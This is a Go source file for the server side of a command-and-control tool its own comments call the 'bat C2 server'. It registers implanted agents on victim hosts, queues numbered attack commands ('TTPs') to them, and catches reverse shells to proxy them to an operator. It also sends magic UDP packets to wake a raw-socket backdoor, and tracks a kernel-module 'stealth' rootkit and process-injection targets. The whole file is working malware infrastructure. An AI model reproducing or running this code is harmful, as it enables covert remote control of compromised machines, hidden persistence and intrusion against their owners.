package server

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"core/mon/internal/protocol"
)

//  ANSI palette (used in format helpers)                                  
const (
	clrReset = "\033[0m"
	clrBold  = "\033[1m"
	clrDim   = "\033[2m"
	clrGray  = "\033[90m"   // dark gray
	clrWhite = "\033[97m"   // bright white
	clrBoldW = "\033[1;97m" // bold bright white
)

// stateFile is the path where agent identity state is persisted across server restarts.
var stateFile = filepath.Join(os.Getenv("HOME"), ".bat-state.json")

// agentRecord is the on-disk representation of a known agent identity.
type agentRecord struct {
	AgentID       string    `json:"agent_id,omitempty"` // canonical agent ID
	HostKey       string    `json:"host_key"`            // "IP|Hostname"
	Name          string    `json:"name"`
	FirstSeen     time.Time `json:"first_seen"`
	LastSeen      time.Time `json:"last_seen,omitempty"`
	OS            string    `json:"os,omitempty"`
	Arch          string    `json:"arch,omitempty"`
	UID           int       `json:"uid,omitempty"`
	Pinned        bool      `json:"pinned,omitempty"`
	StealthStatus string    `json:"perf_state,omitempty"` // last TTP-1000 report from agent
}

// loadState reads persisted agent records and returns a hostKey→record map.
func loadState() map[string]agentRecord {
	out := make(map[string]agentRecord)
	data, err := os.ReadFile(stateFile)
	if err != nil {
		return out
	}
	var records []agentRecord
	if json.Unmarshal(data, &records) != nil {
		return out
	}
	for _, r := range records {
		out[r.HostKey] = r
	}
	return out
}

// offlineThreshold: agents unseen longer than this are shown as offline in ls.
const offlineThreshold = 2 * time.Minute

// saveState writes the current agent identities to disk (non-blocking, best-effort).
func (s *Server) saveState() {
	records := make([]agentRecord, 0, len(s.agents))
	for _, a := range s.agents {
		hk := a.IP + "|" + a.Hostname
		records = append(records, agentRecord{
			AgentID:       a.ID,
			HostKey:       hk,
			Name:          a.Name,
			FirstSeen:     a.FirstSeen,
			LastSeen:      a.LastSeen,
			OS:            a.OS,
			Arch:          a.Arch,
			UID:           a.UID,
			Pinned:        a.Pinned,
			StealthStatus: a.StealthStatus,
		})
	}
	data, err := json.MarshalIndent(records, "", "  ")
	if err != nil {
		return
	}
	os.WriteFile(stateFile, data, 0600)
}

// Agent tracks a connected agent.
type Agent struct {
	ID             string
	Name           string    // operator-assigned display name (empty = use ID)
	FirstSeen      time.Time // time of first check-in
	IP             string
	Hostname       string
	OS             string
	Arch           string
	UID            int
	LastSeen       time.Time
	LastTTP        int
	LastResult     string
	LastError      string
	Env            *protocol.EnvReport // R-01: latest env fingerprint from agent
	LastKO         *KCCResponse        // K-series: most recent .ko from KCC (nil if not compiled)
	Pinned         bool                // operator-pinned: floats to top in ls
	StealthStatus  string              // last TTP-1000 report: "[stealth_active]", "[stealth_failed:...]", etc.
}

// Server is the bat C2 server.
type Server struct {
	mu        sync.Mutex
	agents    map[string]*Agent
	hostIdx   map[string]string            // "IP|Hostname" → agentID   deduplication index
	knownHost map[string]agentRecord       // persisted records keyed by "IP|Hostname"
	pending   map[string]*protocol.Command // agentID -> next command
	global    *protocol.Command            // command for all agents (when no specific ID)
	listener  net.Listener
	results   chan string
	secret    string
}

// New creates a server instance and loads persisted agent state.
// Known agents are restored as offline entries so they appear in ls immediately.
func New(secret string) *Server {
	state := loadState()
	s := &Server{
		agents:    make(map[string]*Agent),
		hostIdx:   make(map[string]string),
		knownHost: state,
		pending:   make(map[string]*protocol.Command),
		results:   make(chan string, 64),
		secret:    secret,
	}
	for hk, rec := range state {
		if rec.AgentID == "" {
			continue // old state file without AgentID   skip
		}
		parts := strings.SplitN(hk, "|", 2)
		ip, hostname := "", ""
		if len(parts) == 2 {
			ip, hostname = parts[0], parts[1]
		}
		s.agents[rec.AgentID] = &Agent{
			ID:            rec.AgentID,
			Name:          rec.Name,
			FirstSeen:     rec.FirstSeen,
			LastSeen:      rec.LastSeen,
			IP:            ip,
			Hostname:      hostname,
			OS:            rec.OS,
			Arch:          rec.Arch,
			UID:           rec.UID,
			Pinned:        rec.Pinned,
			StealthStatus: rec.StealthStatus,
		}
		s.hostIdx[hk] = rec.AgentID
	}
	return s
}

// Results returns the channel where TTP results are published.
func (s *Server) Results() <-chan string {
	return s.results
}

// ListAgents returns a snapshot of connected agents, sorted by FirstSeen.
func (s *Server) ListAgents() []*Agent {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]*Agent, 0, len(s.agents))
	for _, a := range s.agents {
		cp := *a
		out = append(out, &cp)
	}
	sort.Slice(out, func(i, j int) bool {
		return out[i].FirstSeen.Before(out[j].FirstSeen)
	})
	return out
}

// QueueTTP queues a TTP command for a specific agent or all agents.
func (s *Server) QueueTTP(ttp int, params string, agentID string) {
	cmd := &protocol.Command{TTP: ttp, Params: params}
	s.mu.Lock()
	defer s.mu.Unlock()
	if agentID == "" {
		s.global = cmd
	} else {
		s.pending[agentID] = cmd
	}
}

// ResolveID resolves an identifier (agent ID or display name) to the canonical agent ID.
// Accepts exact agentID match first, then case-insensitive name match.
// Returns "" if not found.
func (s *Server) ResolveID(idOrName string) string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, ok := s.agents[idOrName]; ok {
		return idOrName
	}
	lower := strings.ToLower(idOrName)
	for id, a := range s.agents {
		if a.Name != "" && strings.ToLower(a.Name) == lower {
			return id
		}
	}
	return ""
}

// RemoveAgent removes an agent from the in-memory list, dedup index, and persisted state.
// The agent will reappear automatically if it checks in again.
func (s *Server) RemoveAgent(agentID string) {
	s.mu.Lock()
	a, ok := s.agents[agentID]
	if ok {
		hk := a.IP + "|" + a.Hostname
		delete(s.agents, agentID)
		delete(s.hostIdx, hk)
		delete(s.knownHost, hk)
		delete(s.pending, agentID)
	}
	s.mu.Unlock()
	if ok {
		go s.saveState()
	}
}

// FlushAgents removes all agents from the in-memory list and persisted state.
// Returns the number of agents removed.
func (s *Server) FlushAgents() int {
	s.mu.Lock()
	n := len(s.agents)
	s.agents = make(map[string]*Agent)
	s.hostIdx = make(map[string]string)
	s.knownHost = make(map[string]agentRecord)
	s.pending = make(map[string]*protocol.Command)
	s.global = nil
	s.mu.Unlock()
	go s.saveState()
	return n
}

// PinAgent sets or clears the Pinned flag for the given agent ID.
// Pinned agents float to the top of the ls listing.
func (s *Server) PinAgent(agentID string, pinned bool) {
	s.mu.Lock()
	a, ok := s.agents[agentID]
	if ok {
		a.Pinned = pinned
	}
	s.mu.Unlock()
	if ok {
		go s.saveState()
	}
}

// RenameAgent sets a display name for the given agent ID and persists the state.
func (s *Server) RenameAgent(agentID, name string) {
	s.mu.Lock()
	if a, ok := s.agents[agentID]; ok {
		a.Name = name
		hostKey := a.IP + "|" + a.Hostname
		s.knownHost[hostKey] = agentRecord{
			HostKey:   hostKey,
			Name:      name,
			FirstSeen: a.FirstSeen,
		}
	}
	s.mu.Unlock()
	go s.saveState()
}

// handleCheckIn processes agent check-ins.
func (s *Server) handleCheckIn(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read body", http.StatusBadRequest)
		return
	}

	var checkin protocol.CheckIn
	if err := protocol.Decode(body, &checkin); err != nil {
		http.Error(w, "decode", http.StatusBadRequest)
		return
	}

	if !protocol.ValidateToken(s.secret, checkin.AgentID, checkin.Token) {
		w.WriteHeader(http.StatusOK)
		return
	}

	remoteIP, _, _ := net.SplitHostPort(r.RemoteAddr)
	hostKey := remoteIP + "|" + checkin.Hostname

	s.mu.Lock()

	// Resolve identity from persisted state (survives server restarts).
	// Priority: 1) same AgentID already in memory  2) knownHost record  3) old in-memory entry with same hostKey
	preservedName := ""
	prevPinned := false
	firstSeen := time.Now()
	known := false

	if existing, ok := s.agents[checkin.AgentID]; ok {
		// Same agent reconnecting   preserve everything.
		firstSeen = existing.FirstSeen
		preservedName = existing.Name
		prevPinned = existing.Pinned
		known = true
	} else {
		// New AgentID: check persisted state first, then in-memory dedup.
		if rec, ok := s.knownHost[hostKey]; ok {
			preservedName = rec.Name
			prevPinned = rec.Pinned
			firstSeen = rec.FirstSeen
			known = true // same host reconnecting with new ID   suppress [agent connected]
		}
		// Remove stale in-memory entry for the same host (agent restarted).
		if oldID, exists := s.hostIdx[hostKey]; exists && oldID != checkin.AgentID {
			if old, ok := s.agents[oldID]; ok {
				if preservedName == "" {
					preservedName = old.Name
				}
				if !prevPinned {
					prevPinned = old.Pinned
				}
			}
			delete(s.agents, oldID)
			for k, v := range s.hostIdx {
				if v == oldID {
					delete(s.hostIdx, k)
					break
				}
			}
		}
	}

	var prevKO *KCCResponse
	var prevStealthStatus string
	if old, ok := s.agents[checkin.AgentID]; ok {
		prevKO = old.LastKO
		prevStealthStatus = old.StealthStatus
	}
	// Also try to recover stealth state from persisted knownHost record.
	if prevStealthStatus == "" {
		if rec, ok := s.knownHost[hostKey]; ok {
			prevStealthStatus = rec.StealthStatus
		}
	}

	// TTP 1000 carries K-series status report from the agent goroutine.
	// Update the stealth status before creating the agent record so it's saved immediately.
	newStealthStatus := prevStealthStatus
	if checkin.LastTTP == 1000 && checkin.LastResult != "" {
		newStealthStatus = checkin.LastResult
	}
	// checkin.StealthStatus is a live sysfs read from the agent   authoritative when non-empty.
	// Overrides both the cached prev value and TTP 1000 reports. This ensures spec is correct
	// even after server restarts (sysfs is the ground truth while the module is loaded).
	if checkin.StealthStatus != "" {
		newStealthStatus = checkin.StealthStatus
	}

	s.agents[checkin.AgentID] = &Agent{
		ID:             checkin.AgentID,
		Name:           preservedName,
		Pinned:         prevPinned,
		FirstSeen:      firstSeen,
		IP:             remoteIP,
		Hostname:       checkin.Hostname,
		OS:             checkin.OS,
		Arch:           checkin.Arch,
		UID:            checkin.UID,
		LastSeen:       time.Now(),
		LastTTP:        checkin.LastTTP,
		LastResult:     checkin.LastResult,
		LastError:      checkin.LastError,
		Env:            checkin.Env,
		LastKO:         prevKO,
		StealthStatus:  newStealthStatus,
	}
	s.hostIdx[hostKey] = checkin.AgentID
	// Update persisted state for this host.
	s.knownHost[hostKey] = agentRecord{
		AgentID:       checkin.AgentID,
		HostKey:       hostKey,
		Name:          preservedName,
		FirstSeen:     firstSeen,
		LastSeen:      time.Now(),
		OS:            checkin.OS,
		Arch:          checkin.Arch,
		UID:           checkin.UID,
		Pinned:        prevPinned,
		StealthStatus: newStealthStatus,
	}
	go s.saveState()

	// Notify console on first check-in.
	if !known {
		label := checkin.AgentID
		if preservedName != "" {
			label = preservedName + " (" + checkin.AgentID + ")"
		}
		msg := fmt.Sprintf("[agent connected] %s @ %s (%s)", label, remoteIP, checkin.Hostname)
		select {
		case s.results <- msg:
		default:
		}
	}

	// Publish TTP result.
	// TTP 1000 is an internal K-series status report   shown as [stealth] event, not [result].
	if checkin.LastTTP != 0 {
		label := checkin.AgentID
		if a, ok := s.agents[checkin.AgentID]; ok && a.Name != "" {
			label = a.Name
		}
		var msg string
		if checkin.LastTTP == 1000 {
			msg = fmt.Sprintf("[stealth] %s: %s", label, checkin.LastResult)
		} else if checkin.LastError != "" {
			msg = fmt.Sprintf("[result] %s TTP %d error: %s", label, checkin.LastTTP, checkin.LastError)
		} else {
			result := checkin.LastResult
			if len(result) > 200 {
				result = result[:200] + "..."
			}
			msg = fmt.Sprintf("[result] %s TTP %d: %s", label, checkin.LastTTP, result)
		}
		select {
		case s.results <- msg:
		default:
		}
	}

	// Dispatch next command.
	cmd := &protocol.Command{TTP: 0}
	if c, ok := s.pending[checkin.AgentID]; ok {
		cmd = c
		delete(s.pending, checkin.AgentID)
	} else if s.global != nil {
		cmd = s.global
		s.global = nil
	}
	s.mu.Unlock()

	resp, err := protocol.Encode(cmd)
	if err != nil {
		http.Error(w, "encode", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(resp)
}

// SendMagicPacket sends a UDP magic packet to wake the rawsock listener (Fase 3).
func (s *Server) SendMagicPacket(targetIP string, magicKey [8]byte, callbackPort uint16) error {
	conn, err := net.Dial("udp", net.JoinHostPort(targetIP, "54321"))
	if err != nil {
		return fmt.Errorf("dial udp: %w", err)
	}
	defer conn.Close()
	payload := make([]byte, 10)
	copy(payload[0:8], magicKey[:])
	payload[8] = byte(callbackPort >> 8)
	payload[9] = byte(callbackPort)
	_, err = conn.Write(payload)
	return err
}

// PrepareRawsockListener binds the TCP listener synchronously before sending magic packet.
func (s *Server) PrepareRawsockListener(callbackPort int) (net.Listener, error) {
	return net.Listen("tcp", fmt.Sprintf(":%d", callbackPort))
}

// AcceptRawsockSession accepts the reverse connection and proxies to operator terminal.
func (s *Server) AcceptRawsockSession(ln net.Listener, out io.Writer, in io.Reader) {
	defer ln.Close()
	fmt.Fprintf(out, "[rawsock] waiting on %s\n", ln.Addr())
	conn, err := ln.Accept()
	if err != nil {
		return
	}
	fmt.Fprintf(out, "[rawsock] session from %s\n", conn.RemoteAddr())
	done := make(chan struct{})
	go func() { io.Copy(conn, in); done <- struct{}{} }()
	go func() { io.Copy(out, conn); done <- struct{}{} }()
	<-done
	conn.Close()
	fmt.Fprintf(out, "\n[rawsock] session ended\n")
}

// StartShellListener opens TCP on the given port and proxies to the operator terminal.
func (s *Server) StartShellListener(port int, out io.Writer, in io.Reader) {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		fmt.Fprintf(out, "[shell] listen error: %v\n", err)
		return
	}
	fmt.Fprintf(out, "[shell] waiting on :%d\n", port)
	conn, err := ln.Accept()
	ln.Close()
	if err != nil {
		return
	}
	fmt.Fprintf(out, "[shell] connected from %s\n", conn.RemoteAddr())
	done := make(chan struct{})
	go func() { io.Copy(conn, in); done <- struct{}{} }()
	go func() { io.Copy(out, conn); done <- struct{}{} }()
	<-done
	conn.Close()
	fmt.Fprintf(out, "\n[shell] session ended\n")
}

// ListenAndServeTLS starts the HTTPS server with a self-signed cert.
func (s *Server) ListenAndServeTLS(addr string) error {
	tlsCert, err := generateSelfSignedCert()
	if err != nil {
		return fmt.Errorf("generate cert: %w", err)
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/check-in", s.handleCheckIn)

	tlsConfig := &tls.Config{Certificates: []tls.Certificate{tlsCert}}

	const soReusePort = 0xf
	lc := net.ListenConfig{
		Control: func(network, address string, c syscall.RawConn) error {
			return c.Control(func(fd uintptr) {
				syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
				syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, soReusePort, 1)
			})
		},
	}
	rawLn, err := lc.Listen(context.Background(), "tcp", addr)
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}
	ln := tls.NewListener(rawLn, tlsConfig)
	s.listener = ln

	fmt.Printf("[server] listening on %s\n", addr)
	httpSrv := &http.Server{
		Handler:  mux,
		ErrorLog: log.New(tlsErrFilter{}, "", 0),
	}
	return httpSrv.Serve(ln)
}

// tlsErrFilter silences TLS handshake noise from tunnel probes / EOF probes.
// These are emitted by the SSH reverse tunnel health-checks and plain-HTTP
// scanners hitting the TLS port   they are not actionable and clutter the console.
type tlsErrFilter struct{}

func (tlsErrFilter) Write(p []byte) (int, error) {
	msg := string(p)
	if strings.Contains(msg, "TLS handshake error") {
		return len(p), nil // drop
	}
	os.Stderr.Write(p)
	return len(p), nil
}

// Close shuts down the listener.
func (s *Server) Close() error {
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

func generateSelfSignedCert() (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: "svc"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyDER, _ := x509.MarshalECPrivateKey(key)
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	return tls.X509KeyPair(certPEM, keyPEM)
}

// FormatAgentTable returns a formatted, sorted agent list.
// Sort order: pinned first, then online before offline, then by FirstSeen.
// pad returns s left-padded to width using the string's rune length (no ANSI awareness needed
// because we pad BEFORE adding color escapes).
func pad(s string, width int) string {
	if len(s) >= width {
		return s
	}
	return s + strings.Repeat(" ", width-len(s))
}

func FormatAgentTable(agents []*Agent) string {
	if len(agents) == 0 {
		return "  (no agents)\n"
	}

	sorted := make([]*Agent, len(agents))
	copy(sorted, agents)
	sort.Slice(sorted, func(i, j int) bool {
		pi, pj := sorted[i].Pinned, sorted[j].Pinned
		if pi != pj {
			return pi
		}
		oi := !sorted[i].LastSeen.IsZero() && time.Since(sorted[i].LastSeen) < offlineThreshold
		oj := !sorted[j].LastSeen.IsZero() && time.Since(sorted[j].LastSeen) < offlineThreshold
		if oi != oj {
			return oi
		}
		return sorted[i].FirstSeen.Before(sorted[j].FirstSeen)
	})

	var buf bytes.Buffer

	// Header   gray labels, no color on data
	hdr := func(s string, w int) string { return clrGray + pad(s, w) + clrReset }
	fmt.Fprintf(&buf, "  %s %s %s %s %s %s %s\n",
		hdr("AGENT", 23), hdr("STATUS", 8), hdr("IP", 16),
		hdr("HOSTNAME", 22), hdr("OS/ARCH", 12), hdr("UID", 4), hdr("LAST-SEEN", 9))
	// Separator   dim
	fmt.Fprintf(&buf, "  %s\n", clrDim+strings.Repeat("", 100)+clrReset)

	for _, a := range sorted {
		label := a.ID
		if a.Name != "" {
			label = a.Name
		}
		if a.Pinned {
			label = "*" + label
		}
		if len(label) > 23 {
			label = label[:20] + "..."
		}

		online := !a.LastSeen.IsZero() && time.Since(a.LastSeen) < offlineThreshold

		// status: bold white for online, dark gray for offline
		var statusStr string
		if online {
			statusStr = clrBoldW + pad("on", 8) + clrReset
		} else {
			statusStr = clrGray + pad("off", 8) + clrReset
		}

		var lastSeen string
		if a.LastSeen.IsZero() {
			lastSeen = "never"
		} else {
			lastSeen = time.Since(a.LastSeen).Truncate(time.Second).String() + " ago"
		}

		// Agent label: white; other fields: default
		fmt.Fprintf(&buf, "  %s %s %s %s %s %s %s\n",
			clrWhite+pad(label, 23)+clrReset,
			statusStr,
			pad(a.IP, 16),
			pad(a.Hostname, 22),
			pad(a.OS+"/"+a.Arch, 12),
			pad(fmt.Sprintf("%d", a.UID), 4),
			lastSeen)
	}
	return buf.String()
}

// FormatAgentSpec returns a detailed spec block for a single agent.
func (s *Server) FormatAgentSpec(agentID string) string {
	s.mu.Lock()
	a, ok := s.agents[agentID]
	if !ok {
		s.mu.Unlock()
		return fmt.Sprintf("  agent not found: %s\n", agentID)
	}
	cp := *a
	s.mu.Unlock()

	var buf bytes.Buffer

	// lv = label+value row; lbl is gray, val is white
	lv := func(lbl, val string) {
		fmt.Fprintf(&buf, "  %s%s%s  %s%s%s\n",
			clrGray, pad(lbl, 22), clrReset,
			clrWhite, val, clrReset)
	}

	label := cp.ID
	if cp.Name != "" {
		label = cp.Name + "  (" + cp.ID + ")"
	}
	sep := clrDim + strings.Repeat("", 52) + clrReset
	fmt.Fprintf(&buf, "\n  %s%s%s\n  %s\n", clrBoldW, label, clrReset, sep)

	lv("ID:", cp.ID)
	lv("Hostname:", cp.Hostname)
	lv("IP:", cp.IP)
	lv("OS/Arch:", cp.OS+"/"+cp.Arch)
	lv("UID:", fmt.Sprintf("%d", cp.UID))

	if !cp.FirstSeen.IsZero() {
		lv("First seen:", cp.FirstSeen.Format("2006-01-02 15:04:05"))
		lv("Last seen:", time.Since(cp.LastSeen).Truncate(time.Second).String()+" ago")
		lv("Up since:", time.Since(cp.FirstSeen).Truncate(time.Second).String())
	}

	if cp.Env != nil {
		fmt.Fprintln(&buf)
		lv("Kernel:", cp.Env.KernelVersion)
		lv("Distro:", cp.Env.Distro)
		lv("Ptrace scope:", fmt.Sprintf("%d", cp.Env.PtraceScope))
		lv("SELinux:", cp.Env.SELinuxMode)
	}

	fmt.Fprintln(&buf)
	switch {
	case cp.StealthStatus == "[stealth_active]":
		koInfo := ""
		if cp.LastKO != nil {
			koInfo = fmt.Sprintf("  (sha256: %s...)", cp.LastKO.KOSha256[:16])
		}
		fmt.Fprintf(&buf, "  %s%s%s  %sACTIVE%s%s\n",
			clrGray, pad("Stealth (.ko):", 22), clrReset,
			clrBoldW, koInfo, clrReset)
	case strings.HasPrefix(cp.StealthStatus, "[stealth_failed:"):
		reason := strings.TrimSuffix(strings.TrimPrefix(cp.StealthStatus, "[stealth_failed: "), "]")
		fmt.Fprintf(&buf, "  %s%s%s  failed: %s\n",
			clrGray, pad("Stealth (.ko):", 22), clrReset, reason)
	case strings.HasPrefix(cp.StealthStatus, "[stealth_skip:"):
		reason := strings.TrimSuffix(strings.TrimPrefix(cp.StealthStatus, "[stealth_skip: "), "]")
		fmt.Fprintf(&buf, "  %s%s%s  skip: %s\n",
			clrGray, pad("Stealth (.ko):", 22), clrReset, reason)
	case cp.LastKO != nil:
		fmt.Fprintf(&buf, "  %s%s%s  compiled (sha256: %s...)  agent not yet confirmed\n",
			clrGray, pad("Stealth (.ko):", 22), clrReset, cp.LastKO.KOSha256[:16])
	default:
		fmt.Fprintf(&buf, "  %s%s%s  %snot loaded%s\n",
			clrGray, pad("Stealth (.ko):", 22), clrReset, clrDim, clrReset)
	}

	if cp.Env != nil && cp.Env.TargetPID > 0 {
		fmt.Fprintln(&buf)
		lv("Inject target:", fmt.Sprintf("%s (pid %d)", cp.Env.TargetComm, cp.Env.TargetPID))
		lv("RELRO:", cp.Env.TargetRELRO)
		lv("CAP_NET_RAW:", fmt.Sprintf("%v", cp.Env.TargetCapNetRaw))
		lv("NoNewPrivs:", fmt.Sprintf("%v", cp.Env.TargetNoNewPrivs))
	}
	fmt.Fprintln(&buf)
	return buf.String()
}

// GetAgentArch returns the GOARCH string reported by the agent, or "" if unknown.
func (s *Server) GetAgentArch(agentID string) string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if a, ok := s.agents[agentID]; ok {
		return a.Arch
	}
	return ""
}

// StoreKO stores a KCC compile result for the given agent.
func (s *Server) StoreKO(agentID string, resp *KCCResponse) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if a, ok := s.agents[agentID]; ok {
		a.LastKO = resp
	}
}

// GetKO returns the stored KCC result for the given agent, or nil if not compiled.
func (s *Server) GetKO(agentID string) *KCCResponse {
	s.mu.Lock()
	defer s.mu.Unlock()
	if a, ok := s.agents[agentID]; ok {
		return a.LastKO
	}
	return nil
}

// PublishResult sends a message to the operator console (non-blocking).
func (s *Server) PublishResult(msg string) {
	select {
	case s.results <- msg:
	default:
	}
}

// GetAgentEnv returns the stored EnvReport for the given agentID, or nil if unknown.
func (s *Server) GetAgentEnv(agentID string) *protocol.EnvReport {
	s.mu.Lock()
	defer s.mu.Unlock()
	if a, ok := s.agents[agentID]; ok {
		return a.Env
	}
	return nil
}

// FormatEnvReport renders an EnvReport as a human-readable table for the console.
func FormatEnvReport(agentID string, env *protocol.EnvReport) string {
	if env == nil {
		return fmt.Sprintf("  agent %s: no env report available\n", agentID)
	}
	var buf bytes.Buffer
	fmt.Fprintf(&buf, "  Env   %s\n", agentID)
	fmt.Fprintf(&buf, "  %-22s %s\n", "Distro:", env.Distro)
	fmt.Fprintf(&buf, "  %-22s %s\n", "Kernel:", env.KernelVersion)
	fmt.Fprintf(&buf, "  %-22s %d\n", "PtraceScope:", env.PtraceScope)
	fmt.Fprintf(&buf, "  %-22s %s\n", "SELinux:", env.SELinuxMode)
	fmt.Fprintf(&buf, "  %-22s %s (pid %d)\n", "Target:", env.TargetComm, env.TargetPID)
	fmt.Fprintf(&buf, "  %-22s %s\n", "Target RELRO:", env.TargetRELRO)
	fmt.Fprintf(&buf, "  %-22s %v\n", "Target CAP_NET_RAW:", env.TargetCapNetRaw)
	fmt.Fprintf(&buf, "  %-22s %v\n", "Target NoNewPrivs:", env.TargetNoNewPrivs)
	if env.PtraceScope == 3 {
		fmt.Fprintf(&buf, "  [WARN] ptrace_scope=3   /proc/PID/mem write likely blocked\n")
	}
	if !env.TargetCapNetRaw {
		fmt.Fprintf(&buf, "  [WARN] CAP_NET_RAW absent   rawsock thread will fail\n")
	}
	return buf.String()
}

// FormatResultTable shows last TTP results from agents.
func FormatResultTable(agents []*Agent) string {
	var buf bytes.Buffer
	found := false
	for _, a := range agents {
		if a.LastTTP != 0 {
			if !found {
				hdr := func(s string, w int) string { return clrGray + pad(s, w) + clrReset }
				fmt.Fprintf(&buf, "  %s %s %s %s\n",
					hdr("AGENT", 22), hdr("TTP", 6), hdr("STATUS", 10), hdr("RESULT", 6))
				fmt.Fprintf(&buf, "  %s\n", clrDim+strings.Repeat("", 80)+clrReset)
				found = true
			}
			label := a.ID
			if a.Name != "" {
				label = a.Name
			}
			status := "ok"
			result := a.LastResult
			if a.LastError != "" {
				status = "error"
				result = a.LastError
			}
			fmt.Fprintf(&buf, "  %s %s %s %s\n",
				clrWhite+pad(label, 22)+clrReset,
				pad(fmt.Sprintf("%d", a.LastTTP), 6),
				pad(status, 10),
				result)
		}
	}
	if !found {
		return "  (no results)\n"
	}
	return buf.String()
}
